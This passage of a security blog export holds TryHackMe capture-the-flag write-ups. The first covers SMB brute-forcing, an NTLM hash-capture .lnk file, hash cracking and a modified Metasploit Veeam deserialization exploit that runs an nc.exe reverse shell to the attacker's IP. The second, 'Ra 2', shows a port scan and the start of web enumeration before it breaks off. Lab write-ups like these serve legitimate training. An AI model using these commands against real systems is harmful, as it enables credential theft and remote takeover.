Microsoft Windows RPCService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required| smb2-time: | date: 2024-03-09T08:13:11|_ start_date: N/A```{: .nolineno}## Web Enumeration â¤µï¸While checking port 443 I got this static site but the interesting part is where ever I search a character it is responding to a new data like below image and therefore I inspected that search element and got this **search.js** file that indicates a file path which leads to **users.xml** file.![Image](Pasted%20image%2020240309154026.png)_Inspect Element_This path gives me the users information :`assets/data/users.xml`![Image](Pasted%20image%2020240309154139.png)_users.xml file that contains all the users details_I copied all the data in a file named as `user.xml` file and then extracted the usernames in a `username.txt` file ->```bashcat users.xml | grep '' | cut -d '>' -f 2 | cut -d '@' -f 1 > usernames.txt```{: .nolineno}I then did the directory or files bruteforcing with ffuf Tool and I got something ðŸ”½```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Set]â””â”€$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://set.windcorp.thm/FUZZ -e .txt,.php,.aspx /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ 'v2.1.0-dev________________________________________________ :: Method : GET :: URL : https://set.windcorp.thm/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt :: Extensions : .txt .php .aspx :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500________________________________________________assets [Status: 301, Size: 155, Words: 9, Lines: 2, Duration: 293ms]forms [Status: 301, Size: 154, Words: 9, Lines: 2, Duration: 328ms]Forms [Status: 301, Size: 154, Words: 9, Lines: 2, Duration: 761ms]Assets [Status: 301, Size: 155, Words: 9, Lines: 2, Duration: 332ms]appnotes.txt [Status: 200, Size: 146, Words: 21, Lines: 9, Duration: 320ms][WARN] Caught keyboard interrupt (Ctrl-C)```{: .nolineno}While looking into this appnotes.txt file I got this information ðŸ”½![Image](Pasted%20image%2020240315224730.png)_appnotes.txt page_Since the password is common so I will be using common password wordlist with that usernames to brute-force the SMB service login with metasploit smb_login module because the netexec and hydra Tools were not responding therefore â©I used this password wordlist : `/usr/share/wordlists/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt`![Image](Pasted%20image%2020240315232237.png)_smb_login module_While a long wait I got the credentials of **myrtleowe** user . Lets Enumerate further more â©![Image](Pasted%20image%2020240316093630.png)_Netexec Tool for SMB Shares_Now I accessed the SMB login with smbclient Tool and got this ðŸ”½```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Set]â””â”€$ smbclient //10.10.157.106/Files -U myrtleowePassword for [WORKGROUP\\myrtleowe]:Try \"help\" to get a list of possible commands.smb: \\> ls . D 0 Wed Jun 17 02:38:26 2020 .. D 0 Wed Jun 17 02:38:26 2020 Info.txt A 123 Wed Jun 17 03:27:12 2020\t\t10328063 blocks of size 4096. 6164497 blocks availablesmb: \\> get Info.txt getting file \\Info.txt of size 123 as Info.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)smb: \\> exit```{: .nolineno}Now the Info.txt say that ->![Image](Pasted%20image%2020240316111352.png)So for making a zip file that triggers activities for that we have this Tool ðŸ”»This Tools has a way to pensive .lnk file as .zip file and use it as a payload .For more info : https://www.trendmicro.com/en_us/research/17/e/rising-trend-attackers-using-lnk-files-download-malware.html1. Download the .sh file from this site http://www.mamachine.org/mslink/index.en.html2. Now make is executable by giving it permissions.```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Set]â””â”€$ /opt/Tools/mslink_v1.3.shUse : /opt/Tools/mslink_v1.3.sh -l lnk_file_target [-n description] [-w working_dir] [-a cmd_args] [-i icon_path] -o my_file.lnk [-p]Options: -l, --lnk-target Specify the target of the shortcut -o, --output-file Save the shortcut to a file -n, --name Specify a description to the shortcut -w, --working-dir Specifies the command launch directory -a, --arguments Specifies the arguments of the command launched -i, --icon Specifies the icon path -p, --printer-link Generates a network printer shortcut```{: .nolineno}Lets generate a lnk file that will open a smb share file from attacker machine with attackers IP address in it ðŸ”½```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Set]â””â”€$ /opt/Tools/mslink_v1.3.sh -l open_me -n hook -i \\\\\\\\10.11.75.200\\\\share -o share.lnkCreation of a \"local folder\" type shortcut with the target open_me â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Set]â””â”€$ zip share.zip share.lnk updating: share.lnk (deflated 43%) ```{: .nolineno}- Now start the impacket-smbserver and then upload the zip file into the share and wait for response .![Image](Pasted%20image%2020240316110919.png)The Zip file triggers as it executes the lnk file and I have my hash value on smb shares.Lets crack this hash value with John the Ripper Tool now ->```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Set]â””â”€$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txtUsing default input encoding: UTF-8Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])Will run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for status (MichelleWat) 1g 0:00:00:15 DONE (2024-03-16 11:16) 0.06353g/s 911293p/s 911293c/s 911293C/s Use the \"--show --format=netntlmv2\" options to display all of the cracked passwords reliablySession completed. ```{: .nolineno}Lets see that privileges this user has ðŸ”½![Image](Pasted%20image%2020240316112038.png)Now lets winrm into this user .### WinRM Session â©```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Set]â””â”€$ evil-winrm -i 10.10.157.106 -u MichelleWat -p '' Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\MichelleWat\\Documents> cd ..*Evil-WinRM* PS C:\\Users\\MichelleWat> whoamiset\\michellewat*Evil-WinRM* PS C:\\Users\\MichelleWat> tree /f /aFolder PATH listingVolume serial number is 6EC8-9D7CC:.+---3D Objects+---Contacts+---Desktop| Flag2.txt|+---Documents+---Downloads+---Favorites| | Bing.url| || \\---Links+---Links| Desktop.lnk| Downloads.lnk|+---Music+---Pictures+---Saved Games+---Searches\\---Videos*Evil-WinRM* PS C:\\Users\\MichelleWat> cat Desktop\\Flag2.txtFlag2: THM{FLAG_FLAG_FLAG_FLAG_FLAG_FLAG_FLAG}*Evil-WinRM* PS C:\\Users\\MichelleWat>```{: .nolineno}I checked the ports with `netstat -ano` command and I got this further internal connections ðŸ”½```powershell*Evil-WinRM* PS C:\\Users\\MichelleWat\\Desktop> netstat -anoActive Connections Proto Local Address Foreign Address State PID TCP 0.0.0.0:80 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 984 TCP 0.0.0.0:443 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:2805 0.0.0.0:0 LISTENING 3876 TCP 0.0.0.0:3389 0.0.0.0:0 LISTENING 852 TCP 0.0.0.0:5985 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:47001 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:49664 0.0.0.0:0 LISTENING 688 TCP 0.0.0.0:49665 0.0.0.0:0 LISTENING 1088 TCP 0.0.0.0:49666 0.0.0.0:0 LISTENING 848 TCP 0.0.0.0:49667 0.0.0.0:0 LISTENING 784 TCP 0.0.0.0:49669 0.0.0.0:0 LISTENING 1232 TCP 0.0.0.0:49670 0.0.0.0:0 LISTENING 768 TCP 10.10.179.158:139 0.0.0.0:0 LISTENING 4 TCP 10.10.179.158:2805 10.10.179.158:49721 ESTABLISHED 3876 TCP 10.10.179.158:5985 10.11.75.200:37740 TIME_WAIT 0 TCP 10.10.179.158:5985 10.11.75.200:37756 ESTABLISHED 4 TCP 10.10.179.158:5985 10.11.75.200:47736 TIME_WAIT 0 TCP 10.10.179.158:49721 10.10.179.158:2805 ESTABLISHED 3876 TCP 10.10.179.158:50035 51.105.216.71:443 SYN_SENT 2188 TCP 10.10.179.158:50036 93.184.221.240:80 SYN_SENT 1372 TCP 10.10.179.158:50037 93.184.221.240:80 SYN_SENT 1372 TCP 10.10.179.158:50038 52.165.165.26:443 SYN_SENT 848 TCP 127.0.0.1:2805 127.0.0.1:49722 ESTABLISHED 3876 TCP 127.0.0.1:2805 127.0.0.1:49733 ESTABLISHED 3876 TCP 127.0.0.1:2805 127.0.0.1:49737 ESTABLISHED 3876 TCP 127.0.0.1:49722 127.0.0.1:2805 ESTABLISHED 3876 TCP 127.0.0.1:49733 127.0.0.1:2805 ESTABLISHED 3876 TCP 127.0.0.1:49737 127.0.0.1:2805 ESTABLISHED 3876 TCP [::]:80 [::]:0 LISTENING 4 TCP [::]:135 [::]:0 LISTENING 984 TCP [::]:443 [::]:0 LISTENING 4 TCP [::]:445 [::]:0 LISTENING 4 TCP [::]:3389 [::]:0 LISTENING 852 TCP [::]:5985 [::]:0 LISTENING 4 TCP [::]:47001 [::]:0 LISTENING 4 TCP [::]:49664 [::]:0 LISTENING 688 TCP [::]:49665 [::]:0 LISTENING 1088 TCP [::]:49666 [::]:0 LISTENING 848 TCP [::]:49667 [::]:0 LISTENING 784 TCP [::]:49669 [::]:0 LISTENING 1232 TCP [::]:49670 [::]:0 LISTENING 768 UDP 0.0.0.0:123 *:* 2120 UDP 0.0.0.0:500 *:* 848 UDP 0.0.0.0:3389 *:* 852 UDP 0.0.0.0:4500 *:* 848 UDP 0.0.0.0:5353 *:* 1296 UDP 0.0.0.0:5355 *:* 1296 UDP 10.10.179.158:137 *:* 4 UDP 10.10.179.158:138 *:* 4 UDP 127.0.0.1:61299 *:* 848 UDP [::]:123 *:* 2120 UDP [::]:500 *:* 848 UDP [::]:3389 *:* 852 UDP [::]:4500 *:* 848 UDP [::]:5353 *:* 1296 UDP [::]:5355 *:* 1296*Evil-WinRM* PS C:\\Users\\MichelleWat\\Desktop>```{: .nolineno}I noticed port 2805 running internally so lets see what it is from the processes so I noted its process ID that is 3876 from stats ðŸ”½```powershell*Evil-WinRM* PS C:\\Users\\MichelleWat\\Desktop> get-process -id 3876Handles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName------- ------ ----- ----- ------ -- -- ----------- 769 53 53712 73804 3876 0 Veeam.One.Agent.Service```{: .nolineno}So we have Veeam.One.Agent.Service running as background service so lets try to access that from outside and for that I need to port forward this port that will give me access from outside .I tried chisel , socat but failed to port forward this port so I tried plink Tool that can be accessed from [here](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) .First time I was getting this error while executing this â­ï¸![Image](Pasted%20image%2020240316155116.png)_plink Tool_ I tried to reset the ssh services of the attacker machine and reran that command and I got it ->```bashâ”Œâ”€â”€(kaliã‰¿kali)-[/opt/Tools]â””â”€$ sudo systemctl enable ssh [sudo] password for kali: Synchronizing state of ssh.service with SysV service script with /usr/lib/systemd/systemd-sysv-install.Executing: /usr/lib/systemd/systemd-sysv-install enable sshCreated symlink /etc/systemd/system/sshd.service â†’ /usr/lib/systemd/system/ssh.service.Created symlink /etc/systemd/system/multi-user.target.wants/ssh.service â†’ /usr/lib/systemd/system/ssh.service.â”Œâ”€â”€(kaliã‰¿kali)-[/opt/Tools]â””â”€$ sudo systemctl start ssh ```{: .nolineno}Now again try that same command ðŸ˜€```powershell*Evil-WinRM* PS C:\\Users\\MichelleWat\\Desktop> echo 'y' |& .\\plink.exe -ssh -N -l kali -pw kali -R 10.11.75.200:2805:127.0.0.1:2805 10.11.75.200plink.exe : The host key is not cached for this server: + CategoryInfo : NotSpecified: (The host key is...or this server::String) [], RemoteException + FullyQualifiedErrorId : NativeCommandError 10.11.75.200 (port 22)You have no guarantee that the server is the computer youthink it is.The server's ssh-ed25519 key fingerprint is: ssh-ed25519 255 SHA256:iV7kwXbEbGNLibdOYBJWYGOOTpyM6PIUENdHFBPxPmwIf you trust this host, enter \"y\" to add the key to Plink'scache and carry on connecting.If you want to carry on connecting just once, without addingthe key to the cache, enter \"n\".If you do not trust this host, press Return to abandon theconnection.Store key in cache? (y/n, Return cancels connection, i for more info) Using username \"kali\".```{: .nolineno}I checked with nmap and I got this result open ðŸ”½![Image](Pasted%20image%2020240316160629.png)_Nmap Tool_I then started metasploit and searched for this Veeam.One.Agent.Service exploit and got this result : ![Image](Pasted%20image%2020240318132847.png)_Metasploit exploit modules_Now I have to modify this exploit so that I could execute some commands while choosing the Target as 0 which is windows commands.```bashmsf6 exploit(windows/misc/veeam_one_agent_deserialization) > optionsModule options (exploit/windows/misc/veeam_one_agent_deserialization): Name Current Setting Required Description ---- --------------- -------- ----------- HOSTINFO_NAME AgentController yes Name to send in host info (must be recognized by server!) RHOSTS yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/b asics/using-metasploit.html RPORT 2805 yes The target port (TCP) SSL false no Negotiate SSL for incoming connections SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random) When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http: Name Current Setting Required Description ---- --------------- -------- ----------- SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on.Payload options (windows/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: '', seh, thread, process, none) LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen portExploit target: Id Name -- ---- 2 PowerShell StagerView the full module info with the info, or info -d command.msf6 exploit(windows/misc/veeam_one_agent_deserialization) >```{: .nolineno}when I use this show target options I get these 3 options ðŸ”½![Image](Pasted%20image%2020240318143756.png)_Targets for exploit_I set it to 0 as I need to perform the Windows Command execution and changed the Payload as `windows/x64/exec` that allows me to execute command .Now the problem was that there was no option to input any payloads that will be executed so I have to modify the exploit and for that I ran edit command and the exploit code opens up like this ðŸ”»I added this set of code tha will include this CMD key and the value as my payload like this ðŸ”»![Image](Pasted%20image%2020240318144415.png)_Added CMD key and payload as value_Also to make it enable I had to include the exeute_command function along with the datastore key function into it.![Image](Pasted%20image%2020240318144638.png)_execute_command function in ruby_Now I have to add the RHOSTS value as 127.0.0.1 which is localhost also the port forworded address so that's why and the CMD value as reverse shell command like this ðŸ”½```bashmsf6 exploit(windows/misc/veeam_one_agent_deserialization) > optionsModule options (exploit/windows/misc/veeam_one_agent_deserialization): Name Current Setting Required Description ---- --------------- -------- ----------- CMD C:\\ProgramData\\nc.exe 10.11.75.2 yes This is the reverse shell command ! 00 4444 -e powershell HOSTINFO_NAME AgentController yes Name to send in host info (must be recognized by server!) RHOSTS yes The target host(s), see https://docs.metasploit.com/docs/u sing-metasploit/basics/using-metasploit.html RPORT 2805 yes The target port (TCP) SSL false no Negotiate SSL for incoming connections SSLCert no Path to a custom SSL certificate (default is randomly gene rated) URIPATH no The URI to use for this exploit (default is random) When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http: Name Current Setting Required Description ---- --------------- -------- ----------- SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on.Payload options (windows/x64/exec): Name Current Setting Required Description ---- --------------- -------- ----------- CMD yes The command string to execute EXITFUNC process yes Exit technique (Accepted: '', seh, thread, process, none)Exploit target: Id Name -- ---- 0 Windows CommandView the full module info with the info, or info -d command.msf6 exploit(windows/misc/veeam_one_agent_deserialization) > set CMD \"C:\\ProgramData\\nc.exe 10.11.75.200 4444 -e powershell\"CMD => C:\\ProgramData\\nc.exe 10.11.75.200 4444 -e powershellmsf6 exploit(windows/misc/veeam_one_agent_deserialization) > set RHOSTS 127.0.0.1RHOSTS => 127.0.0.1msf6 exploit(windows/misc/veeam_one_agent_deserialization) > run[*] 127.0.0.1:2805 - Connecting to 127.0.0.1:2805[*] 127.0.0.1:2805 - Sending host info to 127.0.0.1:2805[*] 127.0.0.1:2805 - Executing Windows Command for windows/x64/exec[*] 127.0.0.1:2805 - Sending malicious handshake to 127.0.0.1:2805[*] Exploit completed, but no session was created.msf6 exploit(windows/misc/veeam_one_agent_deserialization) >```{: .nolineno}And before running this exploit I uploaded the nc.exe in `C:\\ProgramData\\nc.exe` location with wget command .![Image](Pasted%20image%2020240318145311.png)_uploaded nc.exe executable file_And After running this exploit and catching the reverse shell like this ðŸ”»![Image](Pasted%20image%2020240318143530.png)_Reverse shell !!_```powershellPS C:\\windows\\system32> whoamiwhoamiset\\onePS C:\\windows\\system32> cd C:\\Users\\Administratorcd C:\\Users\\AdministratorPS C:\\Users\\Administrator> tree /f /atree /f /aFolder PATH listingVolume serial number is 6EC8-9D7CC:.+---3D Objects+---Contacts+---Desktop| Flag3.txt| +---Documents+---Downloads+---Favorites| | Bing.url| | | \\---Links+---Links| Desktop.lnk| Downloads.lnk| +---Music+---Pictures+---Saved Games+---Searches\\---VideosPS C:\\Users\\Administrator>```{: .nolineno}I am Administrator Now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Ra 2", "url": "/posts/Ra-2/", "categories": "TryHackMe", "tags": "Active Directory, SeImpersonatePrivilege, GodPotato, ADCS, OpenSSL, pfx, responder, nsupdate, dig, crackpkcs12", "date": "2024-03-08 00:00:00 +0530", "snippet": "| Machine Link | https://tryhackme.com/room/ra2 || ------------------ | ------------------------------ || Operating System | Windows (Active Directory) || Difficulty | Hard ...", "content": "| Machine Link | https://tryhackme.com/room/ra2 || ------------------ | ------------------------------ || Operating System | Windows (Active Directory) || Difficulty | Hard || Machine Created by | @4nqr34z and @theart42 |## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Ra2]â””â”€$ sudo nmap -sC -sV -T4 -p- -oN Nmap_Results.txt 10.10.29.179 -Pn[sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-08 11:32 ISTNmap scan report for 10.10.29.179Host is up (0.18s latency).Not shown: 65498 filtered tcp ports (no-response)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus80/tcp open http Microsoft IIS httpd 10.0|_http-title: Did not follow redirect to https://fire.windcorp.thm/|_http-server-header: Microsoft-IIS/10.088/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-03-08 06:09:47Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)|_ssl-date: 2024-03-08T06:11:35+00:00; -1s from scanner time.| ssl-cert: Subject: commonName=fire.windcorp.thm| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm| Not valid before: 2020-05-29T03:31:08|_Not valid after: 2028-05-29T03:41:03443/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)| ssl-cert: Subject: commonName=fire.windcorp.thm| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm| Not valid before: 2020-05-29T03:31:08|_Not valid after: 2028-05-29T03:41:03|_ssl-date: 2024-03-08T06:11:34+00:00; -1s from scanner time.|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.0| tls-alpn: |_ http/1.1445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=fire.windcorp.thm| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm| Not valid before: 2020-05-29T03:31:08|_Not valid after: 2028-05-29T03:41:03|_ssl-date: 2024-03-08T06:11:35+00:00; -1s from scanner time.2179/tcp open vmrdp?3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)|_ssl-date: 2024-03-08T06:11:36+00:00; -1s from scanner time.| ssl-cert: Subject: commonName=fire.windcorp.thm| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm| Not valid before: 2020-05-29T03:31:08|_Not valid after: 2028-05-29T03:41:033269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=fire.windcorp.thm| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm| Not valid before: 2020-05-29T03:31:08|_Not valid after: 2028-05-29T03:41:03|_ssl-date: 2024-03-08T06:11:35+00:00; 0s from scanner time.3389/tcp open ms-wbt-server Microsoft Terminal Services| ssl-cert: Subject: commonName=Fire.windcorp.thm| Not valid before: 2024-03-07T06:03:59|_Not valid after: 2024-09-06T06:03:59| rdp-ntlm-info: | Target_Name: WINDCORP| NetBIOS_Domain_Name: WINDCORP| NetBIOS_Computer_Name: FIRE| DNS_Domain_Name: windcorp.thm| DNS_Computer_Name: Fire.windcorp.thm| DNS_Tree_Name: windcorp.thm| Product_Version: 10.0.17763|_ System_Time: 2024-03-08T06:10:59+00:00|_ssl-date: 2024-03-08T06:11:35+00:00; 0s from scanner time.5222/tcp open jabber Ignite Realtime Openfire Jabber server 3.10.0 or later| xmpp-info: | STARTTLS Failed| info: | features: | capabilities: | compression_methods: | auth_mechanisms: | errors: | invalid-namespace| (timeout)| unknown: | xmpp: | version: 1.0|_ stream_id: a9jj183c74|_ssl-date: 2024-03-08T06:11:39+00:00; 0s from scanner time.| ssl-cert: Subject: commonName=fire.windcorp.thm| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm| Not valid before: 2020-05-01T08:39:00|_Not valid after: 2025-04-30T08:39:005223/tcp open ssl/jabber Ignite Realtime Openfire Jabber server 3.10.0 or later|_ssl-date: 2024-03-08T06:11:35+00:00; 0s from scanner time.| ssl-cert: Subject: commonName=fire.windcorp.thm| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm| Not valid before: 2020-05-01T08:39:00|_Not valid after: 2025-04-30T08:39:00| xmpp-info: | STARTTLS Failed| info: | features: | compression_methods: | auth_mechanisms: | errors: | (timeout)| unknown: | xmpp: |_ capabilities: 5229/tcp open jaxflow?5262/tcp open jabber Ignite Realtime Openfire Jabber server 3.10.0 or later| xmpp-info: | STARTTLS Failed| info: | features: | capabilities: | compression_methods: | auth_mechanisms: | errors: | invalid-namespace| (timeout)| unknown: | xmpp: | version: 1.0|_ stream_id: 24vkz5o1yh5263/tcp open ssl/jabber Ignite Realtime Openfire Jabber server 3.10.0 or later| ssl-cert: Subject: commonName=fire.windcorp.thm| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm| Not valid before: 2020-05-01T08:39:00|_Not valid after: 2025-04-30T08:39:00| xmpp-info: | STARTTLS Failed| info: | features: | compression_methods: | auth_mechanisms: | errors: | (timeout)| unknown: | xmpp: |_ capabilities: |_ssl-date: 2024-03-08T06:11:35+00:00; -1s from scanner time.5269/tcp open xmpp Wildfire XMPP Client| xmpp-info: | STARTTLS Failed| info: | features: | compression_methods: | auth_mechanisms: | errors: | (timeout)| unknown: | xmpp: |_ capabilities: 5270/tcp open ssl/xmpp Wildfire XMPP Client|_ssl-date: 2024-03-08T06:11:35+00:00; 0s from scanner time.| ssl-cert: Subject: commonName=fire.windcorp.thm| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm| Not valid before: 2020-05-01T08:39:00|_Not valid after: 2025-04-30T08:39:005275/tcp open jabber| fingerprint-strings: | RPCCheck: |_ | xmpp-info: | STARTTLS Failed| info: | features: | capabilities: | compression_methods: | auth_mechanisms: | errors: | invalid-namespace| (timeout)| unknown: | xmpp: | version: 1.0|_ stream_id: 6gkv40ufcs5276/tcp open ssl/jabber Ignite Realtime Openfire Jabber server 3.10.0 or later| ssl-cert: Subject: commonName=fire.windcorp.thm| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm| Not valid before: 2020-05-01T08:39:00|_Not valid after: 2025-04-30T08:39:00| xmpp-info: | STARTTLS Failed| info: | features: | compression_methods: | auth_mechanisms: | errors: | (timeout)| unknown: | xmpp: |_ capabilities: |_ssl-date: 2024-03-08T06:11:35+00:00; -1s from scanner time.7070/tcp open http Jetty 9.4.18.v20190429|_http-title: Openfire HTTP Binding Service|_http-server-header: Jetty(9.4.18.v20190429)7443/tcp open ssl/http Jetty 9.4.18.v20190429|_http-server-header: Jetty(9.4.18.v20190429)| ssl-cert: Subject: commonName=fire.windcorp.thm| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm| Not valid before: 2020-05-01T08:39:00|_Not valid after: 2025-04-30T08:39:00|_http-title: Openfire HTTP Binding Service7777/tcp open socks5 (No authentication; connection not allowed by ruleset)| socks-auth-info: |_ No authentication9090/tcp open zeus-admin?| fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK| Date: Fri, 08 Mar 2024 06:09:47 GMT| Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT| Content-Type: text/html| Accept-Ranges: bytes| Content-Length: 115| | | | | | | | HTTPOptions: | HTTP/1.1 200 OK| Date: Fri, 08 Mar 2024 06:09:56 GMT| Allow: GET,HEAD,POST,OPTIONS| JavaRMI, drda, ibm-db2-das, informix: | HTTP/1.1 400 Illegal character CNTL=0x0| Content-Type: text/html;charset=iso-8859-1| Content-Length: 69| Connection: close| Bad Message 400reason: Illegal character CNTL=0x0| SqueezeCenter_CLI: | HTTP/1.1 400 No URI| Content-Type: text/html;charset=iso-8859-1| Content-Length: 49| Connection: close| Bad Message 400reason: No URI| WMSRequest: | HTTP/1.1 400 Illegal character CNTL=0x1| Content-Type: text/html;charset=iso-8859-1| Content-Length: 69| Connection: close|_ Bad Message 400reason: Illegal character CNTL=0x19091/tcp open ssl/xmltec-xmlmail?| ssl-cert: Subject: commonName=fire.windcorp.thm| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm| Not valid before: 2020-05-01T08:39:00|_Not valid after: 2025-04-30T08:39:00| fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP: | HTTP/1.1 400 Illegal character CNTL=0x0| Content-Type: text/html;charset=iso-8859-1| Content-Length: 69| Connection: close| Bad Message 400reason: Illegal character CNTL=0x0| GetRequest: | HTTP/1.1 200 OK| Date: Fri, 08 Mar 2024 06:10:09 GMT| Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT| Content-Type: text/html| Accept-Ranges: bytes| Content-Length: 115| | | | | | | | HTTPOptions: | HTTP/1.1 200 OK| Date: Fri, 08 Mar 2024 06:10:10 GMT| Allow: GET,HEAD,POST,OPTIONS| Help: | HTTP/1.1 400 No URI| Content-Type: text/html;charset=iso-8859-1| Content-Length: 49| Connection: close| Bad Message 400reason: No URI| RPCCheck: | HTTP/1.1 400 Illegal character OTEXT=0x80| Content-Type: text/html;charset=iso-8859-1| Content-Length: 71| Connection: close| Bad Message 400reason: Illegal character OTEXT=0x80| RTSPRequest: | HTTP/1.1 400 Unknown Version| Content-Type: text/html;charset=iso-8859-1| Content-Length: 58| Connection: close| Bad Message 400reason: Unknown Version| SSLSessionReq: | HTTP/1.1 400 Illegal character CNTL=0x16| Content-Type: text/html;charset=iso-8859-1| Content-Length: 70| Connection: close|_ Bad Message 400reason: Illegal character CNTL=0x169389/tcp open mc-nmf .NET Message Framing49667/tcp open msrpc Microsoft Windows RPC49668/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049669/tcp open msrpc Microsoft Windows RPC49670/tcp open msrpc Microsoft Windows RPC49672/tcp open msrpc Microsoft Windows RPC49692/tcp open msrpc Microsoft Windows RPC49714/tcp open msrpc Microsoft Windows RPC3 services unrecognized despite returning data.```{: .nolineno}## Web Enumeration â¤µï¸I looked into the port 80 and set the hosts file as fire.windcorp.thm .![Image](Pasted%20image%2020240308211317.png)_fire.windcorp.thm_I then checked the port 443 with the same subdomain name and its certificate and I got 2 more subdomains ðŸ”½![Image](Pasted%20image%2020240308211517.png)_Certificate check_I then added both on the `/etc/hosts` file and loaded the site for further enumeration ðŸ”»On ***selfservice.dev.windcorp.thm*** I got this : ![Image](Pasted%20image%2020240308211649.png)_selfservice.dev.windcorp.thm_On ***selfservice.windcorp.thm*** I got a login prompt page like this : ![Image](Pasted%20image%2020240308211850.png)_selfservice.windcorp.thm_On all the subdomains I tried to do directory traversing through feroxbuster Tool and I got these results : ![Image](Pasted%20image%2020240309112440.png)_feroxbuster on subdomain: fire.windcorp.thm _![Image](Pasted%20image%2020240309112614.png)_feroxbuster on subdomain: selfservice.dev.windcorp.thm_On this `selfservice.windcorp.thm` I did not found any directories .Now I looked into `https://selfservice.dev.windcorp.thm/backup/` URL and I got a index directory 